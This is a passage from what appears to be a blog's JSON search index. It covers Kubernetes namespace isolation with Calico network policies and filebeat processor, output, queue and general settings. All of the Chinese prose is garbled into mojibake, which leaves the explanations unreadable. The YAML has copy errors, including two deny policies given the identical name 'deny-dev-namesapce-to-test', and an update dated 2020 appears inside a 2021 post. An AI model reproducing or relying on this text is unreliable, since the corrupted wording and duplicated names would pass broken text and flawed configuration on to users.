å…è®¸ä¸‹é¢æŒ‡å®šçš„è§„åˆ™è®¿é—®,å…¶ä»–è¿›æ¥çš„æµé‡æ‹’ç»,ä¸ä¼šæ‹’ç»å…¬ç½‘æµé‡ source: namespaceSelector: env == \"dev\" # æ ¹æ®æ ‡ç­¾é€‰æ‹©å™¨,é€‰å‡ºnamespace,namespaceä¸‹çš„æ‰€æœ‰å·¥ä½œç«¯ç‚¹å®šä¹‰ä¸ºæºåœ°å€ destination: namespaceSelector: env == \"dev\" # æ ¹æ®æ ‡ç­¾é€‰æ‹©å™¨,é€‰å‡ºnamespace,namespaceä¸‹çš„æ‰€æœ‰å·¥ä½œç«¯ç‚¹å®šä¹‰ä¸ºç›®æ ‡åœ°å€ egress: - action: Allow # å…è®¸æ‰€æœ‰å‡ºå»çš„æµé‡ å·¥ä½œç«¯ç‚¹å³Workload endpointï¼Œcalicoé»˜è®¤ä¼šä¸ºæ¯ä¸ªå®¹å™¨åˆ†é…ä¸€ä¸ªworkload-endpoint 3.é…ç½®æ‹¥æœ‰env=testæ ‡ç­¾çš„namespaceäº’é€š apiVersion: crd.projectcalico.org/v1 kind: GlobalNetworkPolicy metadata: name: allow-label-env-test-namesapce spec: namespaceSelector: enable-env-isolate-policy == \"true\" order: 100 ingress: - action: Allow source: namespaceSelector: env == \"test\" destination: namespaceSelector: env == \"test\" egress: - action: Allow è¿™é‡Œçš„å…¥å£å’Œå‡ºå£æ˜¯ç›¸å¯¹äºç­–ç•¥æ‰§è¡Œè€…ï¼Œè€Œépod ","date":"2021-03-24 09:29","objectID":"/post/2273/:0:2","tags":["k8s"],"title":"k8sä½¿ç”¨calicoå®ç°ä¸åŒnamespaceç½‘ç»œéš”ç¦»","uri":"/post/2273/"},{"categories":["kubernetes"],"content":"ä¸‰ã€æµ‹è¯•devå’Œtestçš„å‘½åç©ºé—´äº’é€šæƒ…å†µ ipä¿¡æ¯ 00424-jfw5lsbri1b.png kk-devçš„æœåŠ¡è®¿é—®pp-devçš„æœåŠ¡ nginxæ­£å¸¸è®¿é—® 67253-0dfubigby71.png kk-devçš„æœåŠ¡è®¿é—®kk-testå’Œpp-testçš„æœåŠ¡ nginxè®¿é—®è¶…æ—¶ 56095-ef68x96t15u.png 91091-o6doszl9uk.png pp-testè®¿é—®kk-testçš„æœåŠ¡ nginxæ­£å¸¸è®¿é—® 96370-859rk8nqv7u.png pp-testè®¿é—®pp-devå’Œkk-devçš„æœåŠ¡ nginxè®¿é—®è¶…æ—¶ 70378-1a96k23ldul.png 42119-loufx5xxqw.png ","date":"2021-03-24 09:29","objectID":"/post/2273/:0:3","tags":["k8s"],"title":"k8sä½¿ç”¨calicoå®ç°ä¸åŒnamespaceç½‘ç»œéš”ç¦»","uri":"/post/2273/"},{"categories":["kubernetes"],"content":"å››ã€æ€»ç»“ å«æœ‰enable-env-isolate-policy=â€œtrue\"çš„namespaceæ‰ä¼šåº”ç”¨æˆ‘ä»¬å®šä¹‰çš„ç½‘ç»œç­–ç•¥ã€‚ æœ€ç»ˆæ•ˆæœæ˜¯env=testçš„å‘½åç©ºé—´ä¸‹çš„podå¯ä»¥äº’ç›¸è®¿é—® env=devçš„å‘½åç©ºé—´ä¸‹çš„podå¯ä»¥äº’ç›¸è®¿é—® 2020.4.11 ä¸Šé¢çš„é…ç½®å½“ä½¿ç”¨nodePortæ—¶ä¼šå‘ç°ä¹Ÿä¸èƒ½è®¿é—® ä¿®æ”¹åçš„ç­–ç•¥å¦‚ä¸‹: 1.æ‹’ç»env=devçš„å‘½åç©ºé—´ä¸­çš„podè®¿é—®testçš„å‘½åç©ºé—´ä¸­çš„pod apiVersion: crd.projectcalico.org/v1 kind: GlobalNetworkPolicy metadata: name: deny-dev-namesapce-to-test spec: namespaceSelector: env == \"dev\" ingress: - action: Allow egress: - action: Deny destination: namespaceSelector: env == \"test\" - action: Allow 2.æ‹’ç»env=testçš„å‘½åç©ºé—´ä¸­çš„podè®¿é—®devçš„å‘½åç©ºé—´ä¸­çš„pod apiVersion: crd.projectcalico.org/v1 kind: GlobalNetworkPolicy metadata: name: deny-dev-namesapce-to-test spec: namespaceSelector: env == \"test\" ingress: - action: Allow egress: - action: Deny destination: namespaceSelector: env == \"dev\" - action: Allow ","date":"2021-03-24 09:29","objectID":"/post/2273/:0:4","tags":["k8s"],"title":"k8sä½¿ç”¨calicoå®ç°ä¸åŒnamespaceç½‘ç»œéš”ç¦»","uri":"/post/2273/"},{"categories":["ELKæ—¥å¿—æ”¶é›†"],"content":"æ‚¨å¯ä»¥åœ¨é…ç½®ä¸­å®šä¹‰processors,ä»¥ä¾¿åœ¨äº‹ä»¶å‘é€åˆ°é…ç½®çš„outputä¹‹å‰å¯¹å…¶è¿›è¡Œå¤„ç†,æ¯”å¦‚åˆ é™¤ï¼Œæ·»åŠ å­—æ®µç­‰ç­‰ã€‚ ","date":"2021-03-22 17:58","objectID":"/post/2272/:0:0","tags":["elk","filebeat"],"title":"ELK-filebeaté…ç½®å¤„ç†å™¨(å…«)","uri":"/post/2272/"},{"categories":["ELKæ—¥å¿—æ”¶é›†"],"content":"ä¸€ã€å®šä¹‰å¤„ç†å™¨ å¤„ç†å™¨å¯ä»¥å®šä¹‰åœ¨å…¨å±€æˆ–è€…ä¸€äº›inputä¸­,è¿˜å¯ä»¥ä½¿ç”¨ä¸€äº›æ¡ä»¶åˆ¤æ–­ä½œå‡ºä¸åŒé€‰æ‹© processors: - \u003cprocessor_name\u003e: when: \u003ccondition\u003e \u003cparameters\u003e - \u003cprocessor_name\u003e: when: \u003ccondition\u003e \u003cparameters\u003e ä¸‹é¢æ˜¯æ”¯æŒçš„å¤„ç†å™¨(å…·ä½“ç”¨æ³•ï¼šhttps://www.elastic.co/guide/en/beats/filebeat/6.8/defining-processors.html#processors) add_cloud_metadata add_locale decode_json_fields drop_event drop_fields include_fields rename add_kubernetes_metadata add_docker_metadata add_host_metadata dissect dns add_process_metadata æ³¨æ„ï¼šé«˜ç‰ˆæœ¬çš„filebeatæ”¯æŒæ›´å¤šçš„ç±»å‹ æ”¯æŒçš„æ¡ä»¶ç±»å‹(å…·ä½“ç”¨æ³•ï¼šhttps://www.elastic.co/guide/en/beats/filebeat/6.8/defining-processors.html#conditions) equals contains regexp range has_fields or and not ","date":"2021-03-22 17:58","objectID":"/post/2272/:0:1","tags":["elk","filebeat"],"title":"ELK-filebeaté…ç½®å¤„ç†å™¨(å…«)","uri":"/post/2272/"},{"categories":["ELKæ—¥å¿—æ”¶é›†"],"content":"äºŒã€ç®€å•ä»‹ç»å‡ ä¸ªå¸¸ç”¨çš„å¤„ç†å™¨ 1.drop_eventï¼šåˆ é™¤äº‹ä»¶ï¼Œå¿…é¡»æŒ‡å®šæ¡ä»¶ # å°†äº‹ä»¶ä¸­levelå±æ€§ç­‰äºdebugçš„äº‹ä»¶åˆ é™¤ processors: - drop_event: when.equals: level: \"debug\" 2.drop_fields: åˆ é™¤äº‹ä»¶ä¸­çš„å±æ€§(å­—æ®µ)ï¼Œå¯ä»¥æ²¡æœ‰æ¡ä»¶ # åˆ é™¤fieldsä¸­æŒ‡å®šçš„æ‰€æœ‰å­—æ®µ processors: - drop_fields: fields: - beat - host - input - source 3.include_fields: æŒ‡å®šå“ªäº›å±æ€§(å­—æ®µ)ä¸åˆ é™¤ï¼Œå…¶ä»–çš„éƒ½ä¼šè¢«åˆ é™¤ # é™¤äº†messageå±æ€§ï¼Œå…¶ä»–å±æ€§å…¨éƒ¨åˆ é™¤ processors: - include_fields: fields: [\"message\"] 4.rename: ä¿®æ”¹å±æ€§(å­—æ®µ)çš„åç§°ã€‚ é…ç½®å‚æ•°: fields: from: å±æ€§(å­—æ®µ)çš„åŸå§‹åç§° to: å±æ€§(å­—æ®µ)çš„æ–°åç§° ignore_missing: å¦‚æœç¼ºå°‘é‡å‘½åçš„å±æ€§(å­—æ®µ)ï¼Œåˆ™ä¸è®°å½•ä»»ä½•é”™è¯¯ã€‚é»˜è®¤false fail_on_error: é‡å‘½åå¤±è´¥æ˜¯å¦æŠ¥é”™ï¼Œé»˜è®¤true # å°†logä¸‹çš„fileå­—æ®µåç§°æ”¹ä¸ºaaa processors: - rename: fields: - from: \"log.file\" - to: \"log.aaa\" 5.dissect: å°†å­—æ®µæŒ‰ç…§æŒ‡å®šè¡¨è¾¾å¼æ¥è§£æï¼Œå°†è§£æå‡ºæ¥çš„å†…å®¹æ·»åŠ åˆ°äº‹ä»¶çš„å±æ€§ä¸­ã€‚ tokenizer: æŒ‡å®šè¡¨è¾¾å¼ field: è¡¨è¾¾å¼åŒ¹é…å“ªä¸ªå­—æ®µ target_prefix: æ·»åŠ åˆ°å“ªä¸ªå±æ€§ä¸‹ # ä½¿ç”¨ç©ºæ ¼åˆ†å‰²messageå­—æ®µçš„å†…å®¹%{xxx}ä»£è¡¨æ–°çš„keyçš„åç§°,éœ€è¦è‡ªå®šä¹‰ã€‚å°†key1å’Œkey2æ·»åŠ åˆ°äº‹ä»¶çš„å±æ€§ä¸­ processors: - dissect: tokenizer: \"%{key1} %{key2}\" field: \"message\" target_prefix: \"\" å¦‚æœè§£æå‡ºé”™ï¼Œä¼šåœ¨log.flagsä¸­æ·»åŠ [dissect_parsing_error]ã€‚ ","date":"2021-03-22 17:58","objectID":"/post/2272/:0:2","tags":["elk","filebeat"],"title":"ELK-filebeaté…ç½®å¤„ç†å™¨(å…«)","uri":"/post/2272/"},{"categories":["ELKæ—¥å¿—æ”¶é›†"],"content":"filebeatæ”¯æŒçš„outputæœ‰å¾ˆå¤šç§,è¿™é‡Œä»‹ç»ä¸‰ç§é…ç½®ã€‚es,logstash,kafkaã€‚ Elasticsearch Logstash Kafka Redis File Console Cloud ","date":"2021-03-22 09:47","objectID":"/post/2269/:0:0","tags":["elk","filebeat"],"title":"ELK-filebeaté…ç½®output(ä¸ƒ)","uri":"/post/2269/"},{"categories":["ELKæ—¥å¿—æ”¶é›†"],"content":"ä¸€ã€Elasticsearch ç¤ºä¾‹ output.elasticsearch: hosts: [\"https://localhost:9200\"] index: \"filebeat-%{[beat.version]}-%{+yyyy.MM.dd}\" ssl.certificate_authorities: [\"/etc/pki/root/ca.pem\"] ssl.certificate: \"/etc/pki/client/cert.pem\" ssl.key: \"/etc/pki/client/cert.key\" ä½¿ç”¨%{[]}å¯ä»¥å¼•ç”¨äº‹ä»¶ä¸­çš„å±æ€§ã€‚ é…ç½®å‚æ•° enable: æ˜¯å¦å¯ç”¨è¿™ä¸ªoutputé…ç½® hosts: æŒ‡å®šesä¸»æœºåˆ—è¡¨ã€‚eg:hosts: [\"10.45.3.2:9220\", \"10.45.3.1:9230\"] compression_level: gzipå‹ç¼©çº§åˆ«ã€‚é»˜è®¤ä¸º0ç¦ç”¨å‹ç¼©ã€‚å‹ç¼©çº§åˆ«å¿…é¡»åœ¨1ï¼ˆæœ€ä½³é€Ÿåº¦ï¼‰åˆ°9ï¼ˆæœ€ä½³å‹ç¼©ï¼‰çš„èŒƒå›´å†…ã€‚å¢åŠ å‹ç¼©çº§åˆ«ä¼šå‡å°‘ç½‘ç»œä½¿ç”¨ï¼Œä½†ä¼šå¢åŠ cpuä½¿ç”¨ã€‚ escape_html: æ˜¯å¦å°†å­—ç¬¦ä¸²ä¸­çš„htmlè½¬ä¹‰ï¼Œé»˜è®¤trueã€‚ worker: ä¸ºæ¯ä¸ªesèŠ‚ç‚¹çš„å¼€å¯çš„å·¥ä½œçº¿ç¨‹æ•°é‡ username: ç”¨æˆ·å password: å¯†ç  parameters: http urlå‚æ•°å­—å…¸ protocol: httpæˆ–httpsåè®® path: esçš„urlè®¿é—®è·¯å¾„ã€‚ headers: è‡ªå®šä¹‰è¯·æ±‚å¤´ index: ç´¢å¼•åç§°ã€‚é»˜è®¤æ˜¯filebeat-%{[beat.version]}-%{+yyyy.MM.dd},å¦‚æœè¦ä¿®æ”¹ç´¢å¼•åå¿…é¡»é…ç½®ä¸‹é¢çš„é€‰é¡¹ã€‚ setup.template.name å’Œ setup.template.pattern output.elasticsearch: hosts: [\"es01:9200\", \"es02:9200\", \"es03:9200\"] index: soulchild-%{+yyyy.MM.dd} setup.template.name: \"soulchild\" setup.template.pattern: \"soulchild-*\" indices: è¿™ä¸ªå‚æ•°å¯ä»¥æ ¹æ®ä¸€äº›æ¡ä»¶ï¼Œæ¥å†™å…¥ä¸åŒçš„ç´¢å¼• index: ç´¢å¼•åç§° mappings: è¿™é‡Œæ˜¯ä¸€ä¸ªå­—å…¸ï¼Œä¼šä¸indexçš„å€¼åšåŒ¹é…ï¼ŒåŒ¹é…çš„å€¼å°±æ˜¯æœ€åçš„ç´¢å¼•å default: é»˜è®¤å€¼ when: æ¡ä»¶ ä¸‹é¢ä¸¾ä¸€äº›ä¾‹å­ï¼š eg1: output.elasticsearch: hosts: [\"http://localhost:9200\"] indices: - index: \"warning-%{[beat.version]}-%{+yyyy.MM.dd}\" when.contains: # å¦‚æœä¸€ä¸ªäº‹ä»¶ä¸­çš„messageå­—æ®µåŒ…å«\"WARN\" ï¼Œç´¢å¼•åç§°å°±æ˜¯\"warning-%{[beat.version]}-%{+yyyy.MM.dd}\" message: \"WARN\" - index: \"error-%{[beat.version]}-%{+yyyy.MM.dd}\" when.contains: # å¦‚æœä¸€ä¸ªäº‹ä»¶ä¸­çš„messageå­—æ®µåŒ…å«\"ERR\" ï¼Œç´¢å¼•åç§°å°±æ˜¯\"error-%{[beat.version]}-% message: \"ERR\" eg2: output.elasticsearch: hosts: [\"http://localhost:9200\"] indices: - index: \"%{[fields.log_type]}\" # å¦‚æœäº‹ä»¶ä¸­\"fields.log_type\"å­—æ®µçš„å€¼æ˜¯criticalï¼Œé‚£ä¹ˆç´¢å¼•å°±æ˜¯sev1ï¼Œå¦‚æœæ˜¯normalé‚£ä¹ˆç´¢å¼•åå°±æ˜¯sev2ï¼Œæ²¡æœ‰åŒ¹é…çš„é¡¹ç´¢å¼•åå°±æ˜¯sev3 mappings: critical: \"sev1\" normal: \"sev2\" default: \"sev3\" bulk_max_size: å•ä¸ªeså¤„ç†çš„æœ€å¤§äº‹ä»¶æ•°ã€‚é»˜è®¤å€¼ä¸º50 backoff.init: è¿æ¥eså¤±è´¥æ—¶ï¼Œç­‰å¾…å¤šå°‘ç§’è¿›è¡Œç¬¬ä¸€æ¬¡é‡è¿ã€‚æ¯é‡è¿ä¸€æ¬¡æŒ‰ç…§æŒ‡æ•°çš„æ–¹å¼å¢åŠ å°è¯•è¿æ¥çš„æ—¶é—´é—´éš”ï¼Œç›´åˆ°backoff.maxç§’ backoff.max: ç½‘ç»œé”™è¯¯åï¼Œåœ¨å°è¯•è¿æ¥åˆ°esä¹‹å‰ç­‰å¾…çš„æœ€å¤§ç§’æ•°ã€‚ç¼ºçœå€¼ä¸º60ç§’ã€‚ timeout: httpè¯·æ±‚çš„è¶…æ—¶æ—¶é—´ ssl: sslç›¸å…³é…ç½®.https://www.elastic.co/guide/en/beats/filebeat/6.8/configuration-ssl.html output.elasticsearch.hosts: [\"https://192.168.1.42:9200\"] output.elasticsearch.ssl.certificate_authorities: [\"/etc/pki/root/ca.pem\"] output.elasticsearch.ssl.certificate: \"/etc/pki/client/cert.pem\" output.elasticsearch.ssl.key: \"/etc/pki/client/cert.key\" ","date":"2021-03-22 09:47","objectID":"/post/2269/:0:1","tags":["elk","filebeat"],"title":"ELK-filebeaté…ç½®output(ä¸ƒ)","uri":"/post/2269/"},{"categories":["ELKæ—¥å¿—æ”¶é›†"],"content":"äºŒã€Logstash ç¤ºä¾‹ output.logstash: hosts: [\"127.0.0.1:5044\"] æ¯ä¸ªäº‹ä»¶éƒ½åŒ…å«å¦‚ä¸‹å­—æ®µ { ... \"@metadata\": { \"beat\": \"filebeat\", \"version\": \"6.8.14\" \"type\": \"doc\" } } é…ç½®å‚æ•° enabled: æ˜¯å¦å¯ç”¨é…ç½® hosts: æŒ‡å®šlogstashä¸»æœºåˆ—è¡¨ã€‚ç¦ç”¨è´Ÿè½½å‡è¡¡åï¼Œå¦‚æœé…ç½®äº†å¤šå°ä¸»æœºï¼Œåˆ™éšæœºé€‰æ‹©ä¸€å°ä¸»æœº(æ— ä¼˜å…ˆçº§)ã€‚å¦‚æœä¸€ä¸ªä¸»æœºå˜å¾—ä¸å¯è¾¾ï¼Œå¦ä¸€ä¸ªä¸»æœºè¢«éšæœºé€‰æ‹©ã€‚ compression_level: gzipå‹ç¼©çº§åˆ«ã€‚é»˜è®¤ä¸º0ç¦ç”¨å‹ç¼©ã€‚å‹ç¼©çº§åˆ«å¿…é¡»åœ¨1ï¼ˆæœ€ä½³é€Ÿåº¦ï¼‰åˆ°9ï¼ˆæœ€ä½³å‹ç¼©ï¼‰çš„èŒƒå›´å†…ã€‚å¢åŠ å‹ç¼©çº§åˆ«ä¼šå‡å°‘ç½‘ç»œä½¿ç”¨ï¼Œä½†ä¼šå¢åŠ cpuä½¿ç”¨ã€‚ escape_html: æ˜¯å¦å°†å­—ç¬¦ä¸²ä¸­çš„htmlè½¬ä¹‰ï¼Œé»˜è®¤trueã€‚ worker: ä¸ºæ¯ä¸ªlogstashèŠ‚ç‚¹å¼€å¯çš„å·¥ä½œçº¿ç¨‹æ•°é‡ã€‚ loadbalance: æ˜¯å¦å¯ç”¨è´Ÿè½½å‡è¡¡ ttl: ä¸logstashå»ºç«‹è¿æ¥çš„å­˜æ´»æ—¶é—´ bulk_max_size: å•ä¸ªlogstashå¤„ç†çš„æœ€å¤§äº‹ä»¶æ•°ã€‚é»˜è®¤å€¼ä¸º50 backoff.init: è¿æ¥logstashå¤±è´¥æ—¶,ç­‰å¾…å¤šå°‘ç§’è¿›è¡Œç¬¬ä¸€æ¬¡é‡è¿ã€‚æ¯é‡è¿ä¸€æ¬¡æŒ‰ç…§æŒ‡æ•°çš„æ–¹å¼å¢åŠ å°è¯•è¿æ¥çš„æ—¶é—´é—´éš”ï¼Œç›´åˆ°backoff.maxç§’ backoff.max: ç½‘ç»œé”™è¯¯åï¼Œåœ¨å°è¯•è¿æ¥åˆ°logstashä¹‹å‰ç­‰å¾…çš„æœ€å¤§ç§’æ•°ã€‚ç¼ºçœå€¼ä¸º60ç§’ã€‚ ","date":"2021-03-22 09:47","objectID":"/post/2269/:0:2","tags":["elk","filebeat"],"title":"ELK-filebeaté…ç½®output(ä¸ƒ)","uri":"/post/2269/"},{"categories":["ELKæ—¥å¿—æ”¶é›†"],"content":"ä¸‰ã€Kafka ç¤ºä¾‹ output.kafka: hosts: [\"kafka1:9092\", \"kafka2:9092\", \"kafka3:9092\"] # æŒ‡å®šä¸»é¢˜ topic: '%{[fields.log_topic]}' partition.round_robin: reachable_only: false required_acks: 1 compression: gzip max_message_bytes: 1000000 è¿™ä¸ªoutputé€‚ç”¨äº0.11åˆ°2.0.0ä¹‹é—´çš„æ‰€æœ‰Kafkaç‰ˆæœ¬ã€‚æ—§ç‰ˆæœ¬ä¹Ÿå¯ä»¥å·¥ä½œï¼Œä½†ä¸åœ¨ç»´æŠ¤ã€‚ é…ç½®å‚æ•° enable: æ˜¯å¦å¯ç”¨é…ç½® hosts: kafka brokerèŠ‚ç‚¹åœ°å€åˆ—è¡¨ version: kafkaçš„ç‰ˆæœ¬å·ã€‚0.8.2.0 ~ 2.0.0ã€‚é»˜è®¤1.0.0 worker: ä¸ºæ¯ä¸ªkafkaèŠ‚ç‚¹å¼€å¯çš„å·¥ä½œçº¿ç¨‹æ•°é‡ã€‚ username: kafkaç”¨æˆ·å password: kafkaå¯†ç  topic: æŒ‡å®šä¸»é¢˜ topics: è¿™ä¸ªå’Œä¸Šé¢esä¸­çš„indicesç±»ä¼¼ topic: ä¸»é¢˜åç§° mappings: è¿™é‡Œæ˜¯ä¸€ä¸ªå­—å…¸ï¼Œä¼šä¸topicçš„å€¼åšåŒ¹é…ï¼ŒåŒ¹é…çš„å€¼å°±æ˜¯æœ€åçš„ç´¢å¼•å default: é»˜è®¤å€¼ when: æ¡ä»¶ key: äº‹ä»¶çš„keyï¼Œç”¨äºè®¡ç®—hashå€¼ partition: æŒ‡å®šè¾“å‡ºkafkaåˆ†åŒºç­–ç•¥ï¼Œä¸‰ä¸ªé€‰é¡¹random,round_robin,hash. é»˜è®¤hash random.group_events: å‘ä¸€ä¸ªåˆ†åŒºå†™å…¥äº‹ä»¶çš„æ•°é‡ï¼Œè¾¾åˆ°æ•°é‡åä¼šéšæœºé€‰æ‹©ä¸€ä¸ªæ–°åˆ†åŒºã€‚é»˜è®¤å€¼æ˜¯1ï¼Œå³åœ¨æ¯ä¸ªäº‹ä»¶ä¹‹åéšæœºé€‰æ‹©ä¸€ä¸ªæ–°åˆ†åŒºã€‚ round_robin.group_events: å‘ä¸€ä¸ªåˆ†åŒºå†™å…¥äº‹ä»¶çš„æ•°é‡ï¼Œè¾¾åˆ°æ•°é‡åä¼šé€‰æ‹©ä¸‹ä¸€ä¸ªåˆ†åŒºã€‚é»˜è®¤å€¼æ˜¯1ï¼Œå³åœ¨æ¯ä¸ªäº‹ä»¶ä¹‹åé€‰æ‹©ä¸‹ä¸€ä¸ªåˆ†åŒºã€‚ hash.hash: ç”¨äºè®¡ç®—åˆ†åŒºhashå€¼çš„å±æ€§åˆ—è¡¨ï¼Œæ²¡æœ‰å®šä¹‰åˆ™ä½¿ç”¨keyè®¾ç½®çš„å€¼ hash.random: å¦‚æœæ— æ³•è®¡ç®—hashæˆ–keyï¼Œåˆ™éšæœºåˆ†å‘äº‹ä»¶ã€‚ random|round_robin|hash.reachable_only: é»˜è®¤æƒ…å†µä¸‹ï¼Œæ‰€æœ‰åˆ†åŒºç­–ç•¥å°†å°è¯•å‘æ‰€æœ‰åˆ†åŒºå‘å¸ƒäº‹ä»¶ã€‚å¦‚æœfilebeatæ— æ³•è®¿é—®åˆ†åŒºçš„leaderï¼Œoutputå¯èƒ½ä¼šé˜»å¡ã€‚å¦‚æœreachable_onlyè®¾ç½®ä¸ºtrueï¼Œäº‹ä»¶å°†åªå‘å¸ƒåˆ°å¯ç”¨åˆ†åŒºã€‚ codec: è¾“å‡ºç¼–ç æ ¼å¼ï¼Œé»˜è®¤json metadata: Kafkaå…ƒæ•°æ®æ›´æ–°ç›¸å…³è®¾ç½®ã€‚metadataä¿¡æ¯brokers, topics, partition, å’Œæ´»åŠ¨çš„leadersç­‰ä¿¡æ¯ refresh_frequency: å…ƒæ•°æ®åˆ·æ–°é—´éš”ã€‚é»˜è®¤ä¸º10åˆ†é’Ÿã€‚ retry.max: é›†ç¾¤åœ¨leaderé€‰ä¸¾æ—¶é‡è¯•è¯»å–å…ƒæ•°æ®æ¬¡æ•°ã€‚ç¼ºçœå€¼æ˜¯3ã€‚ retry.backoff: é‡è¯•æ—¶é—´é—´éš”ã€‚ bulk_max_size: å•ä¸ªkafkaå¤„ç†çš„æœ€å¤§äº‹ä»¶æ•°ã€‚é»˜è®¤å€¼ä¸º50 timeout: ç­‰å¾…kafka brokersçš„å“åº”æ—¶é—´ã€‚é»˜è®¤30s broker_timeout: channel_buffer_size: æ¯ä¸ªKafka brokerè¾“å‡ºç®¡é“ä¸­ç¼“å†²çš„æ¶ˆæ¯æ•°ã€‚ç¼ºçœå€¼æ˜¯256ã€‚ keep_alive: è¿æ¥çš„å­˜æ´»æ—¶é—´ï¼Œé»˜è®¤ä¸º0ï¼Œç¦ç”¨ä¿æŒæ´»åŠ¨è¿æ¥çŠ¶æ€ compression: å‹ç¼©ç±»å‹ï¼Œnoneã€snappyã€lz4ã€gzipã€‚é»˜è®¤gzip compression_level: gzipå‹ç¼©çº§åˆ«ã€‚è®¾ç½®ä¸º0ç¦ç”¨å‹ç¼©ã€‚å‹ç¼©çº§åˆ«å¿…é¡»åœ¨1ï¼ˆæœ€ä½³é€Ÿåº¦ï¼‰åˆ°9ï¼ˆæœ€ä½³å‹ç¼©ï¼‰çš„èŒƒå›´å†…ã€‚å¢åŠ å‹ç¼©çº§åˆ«ä¼šå‡å°‘ç½‘ç»œä½¿ç”¨ï¼Œä½†ä¼šå¢åŠ cpuä½¿ç”¨ã€‚é»˜è®¤4 max_message_bytes: JSONæ¶ˆæ¯çš„æœ€å¤§å…è®¸å¤§å°ã€‚è¶…å‡ºçš„æ¶ˆæ¯å°†è¢«åˆ é™¤ã€‚ç¼ºçœå€¼æ˜¯1000000(å­—èŠ‚)ã€‚æ­¤å€¼åº”å°äºkafkaé…ç½®ä¸­brokerçš„message.max.byteså‚æ•° required_acks: kafkaçš„å“åº”è¿”å›å€¼ï¼Œ0ä½æ— ç­‰å¾…å“åº”è¿”å›ï¼Œç»§ç»­å‘é€ä¸‹ä¸€æ¡æ¶ˆæ¯ï¼›1è¡¨ç¤ºç­‰å¾…æœ¬åœ°æäº¤ï¼ˆleader brokerå·²ç»æˆåŠŸå†™å…¥ï¼Œä½†followeræœªå†™å…¥ï¼‰ï¼Œ-1è¡¨ç¤ºç­‰å¾…æ‰€æœ‰å‰¯æœ¬çš„æäº¤ï¼Œé»˜è®¤ä¸º1 ssl: sslç›¸å…³é…ç½®.https://www.elastic.co/guide/en/beats/filebeat/6.8/configuration-ssl.html ","date":"2021-03-22 09:47","objectID":"/post/2269/:0:3","tags":["elk","filebeat"],"title":"ELK-filebeaté…ç½®output(ä¸ƒ)","uri":"/post/2269/"},{"categories":["ELKæ—¥å¿—æ”¶é›†"],"content":"äº‹ä»¶è¢«å‘é€å‰ä¼šè¢«å­˜å‚¨åˆ°å†…éƒ¨é˜Ÿåˆ—ä¸­ï¼Œé˜Ÿåˆ—è´Ÿè´£ç¼“å†²äº‹ä»¶ï¼Œå¹¶å°†å…¶ç»„åˆæˆå¯ç”±outputä½¿ç”¨çš„æ‰¹å¤„ç†ã€‚outputå°†ä½¿ç”¨æ‰¹é‡æ“ä½œåœ¨ä¸€ä¸ªäº‹åŠ¡ä¸­å‘é€ä¸€æ‰¹äº‹ä»¶ã€‚ ","date":"2021-03-19 10:04","objectID":"/post/2266/:0:0","tags":["elk","filebeat"],"title":"ELK-filebeaté˜Ÿåˆ—ç®€ä»‹(å…­) ","uri":"/post/2266/"},{"categories":["ELKæ—¥å¿—æ”¶é›†"],"content":"å†…å­˜é˜Ÿåˆ—ï¼š å½“é˜Ÿåˆ—ä¸­æœ‰512ä¸ªäº‹ä»¶æˆ–è€…æ”¶åˆ°äº‹ä»¶5ç§’åï¼Œåˆ™æ­¤ç¤ºä¾‹é…ç½®å°†äº‹ä»¶è½¬å‘åˆ°outputï¼š queue.mem: events: 4096 flush.min_events: 512 flush.timeout: 5s ","date":"2021-03-19 10:04","objectID":"/post/2266/:1:0","tags":["elk","filebeat"],"title":"ELK-filebeaté˜Ÿåˆ—ç®€ä»‹(å…­) ","uri":"/post/2266/"},{"categories":["ELKæ—¥å¿—æ”¶é›†"],"content":"å‚æ•°è¯´æ˜ events é˜Ÿåˆ—å¯ä»¥å­˜å‚¨çš„æœ€å¤§äº‹ä»¶æ•°ï¼Œé»˜è®¤4096 flush.min_events é»˜è®¤: 2048ã€‚é˜Ÿåˆ—å­˜å‚¨çš„æœ€å°äº‹ä»¶æ•°ï¼Œå¦‚æœè®¾ç½®ä¸º0ï¼Œåˆ™ç›´æ¥å°†äº‹ä»¶å‘é€åˆ°output flush.timeout é»˜è®¤: 1s. æ”¶åˆ°ä¸€ä¸ªäº‹ä»¶ç­‰å¾…10ç§’å,å°†é˜Ÿåˆ—ä¸­çš„äº‹ä»¶å‘é€åˆ°outputã€‚ å¦‚æœè®¾ç½®ä¸º0ï¼Œåˆ™ç›´æ¥å°†é˜Ÿåˆ—ä¸­äº‹ä»¶å‘é€åˆ°output flush.min_eventså’Œflush.timeoutæ— è®ºå“ªä¸ªå‚æ•°å…ˆç¬¦åˆè¦æ±‚éƒ½ä¼šå°†äº‹ä»¶å‘é€åˆ°output outputä¸­çš„bulk_max_sizeå¯ä»¥é™åˆ¶ä¸€æ¬¡å¤„ç†äº‹ä»¶çš„æ•°é‡ ","date":"2021-03-19 10:04","objectID":"/post/2266/:1:1","tags":["elk","filebeat"],"title":"ELK-filebeaté˜Ÿåˆ—ç®€ä»‹(å…­) ","uri":"/post/2266/"},{"categories":["ELKæ—¥å¿—æ”¶é›†"],"content":"ä¸€ã€å…¨å±€é€‰é¡¹ ä½äºfilebeatå‘½åç©ºé—´ä¸­ã€‚æˆ–è€…ç†è§£ä¸ºå­—æ®µ ","date":"2021-03-18 21:23","objectID":"/post/2262/:1:0","tags":["elk","filebeat"],"title":"ELK-filebeatå¸¸è§„è®¾ç½®é€‰é¡¹(äº”) ","uri":"/post/2262/"},{"categories":["ELKæ—¥å¿—æ”¶é›†"],"content":"filebeat.registry_file æŒ‡å®šæ³¨å†Œè¡¨æ–‡ä»¶ ","date":"2021-03-18 21:23","objectID":"/post/2262/:1:1","tags":["elk","filebeat"],"title":"ELK-filebeatå¸¸è§„è®¾ç½®é€‰é¡¹(äº”) ","uri":"/post/2262/"},{"categories":["ELKæ—¥å¿—æ”¶é›†"],"content":"filebeat.registry_file_permissions æ³¨å†Œè¡¨æ–‡ä»¶çš„æƒé™ï¼Œé»˜è®¤æ˜¯0600ã€‚ ","date":"2021-03-18 21:23","objectID":"/post/2262/:1:2","tags":["elk","filebeat"],"title":"ELK-filebeatå¸¸è§„è®¾ç½®é€‰é¡¹(äº”) ","uri":"/post/2262/"},{"categories":["ELKæ—¥å¿—æ”¶é›†"],"content":"filebeat.registry_flush 